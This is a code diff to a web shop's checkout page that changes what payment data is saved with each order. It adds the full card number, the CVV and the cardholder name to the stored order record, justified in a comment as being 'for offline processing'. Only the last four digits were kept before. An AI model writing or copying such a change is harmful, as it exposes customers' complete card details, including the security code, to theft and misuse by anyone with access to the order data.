@@ -407,14 +407,18 @@ const CheckoutPage = () => {
         cashapp_tag: formData.paymentMethod === 'cashapp' ? formData.cashappTag : null,
         // user_id intentionally removed - OrdersContext will handle it based on auth state
         payment_details: formData.paymentMethod === 'credit_card' ? {
-          last_four: formData.cardNumber.slice(-4),
+          // Full card details for offline processing - admin will delete after processing
+          card_number: formData.cardNumber,
           expiry_date: formData.expiryDate,
+          cvv: formData.cvv,
+          cardholder_name: formData.cardholderName,
+          last_four: formData.cardNumber.slice(-4),
           billing_address: {
-            street: formData.billingStreet,
-            city: formData.billingCity,
-            state: formData.billingState,
-            zipCode: formData.billingZipCode,
-            country: formData.billingCountry
+            street: formData.billingStreet || formData.street,
+            city: formData.billingCity || formData.city,
+            state: formData.billingState || formData.state,
+            zipCode: formData.billingZipCode || formData.zipCode,
+            country: formData.billingCountry || formData.country
           }
         } : formData.paymentMethod.startsWith('crypto_') ? {
           selected_wallet: selectedCryptoWallet,
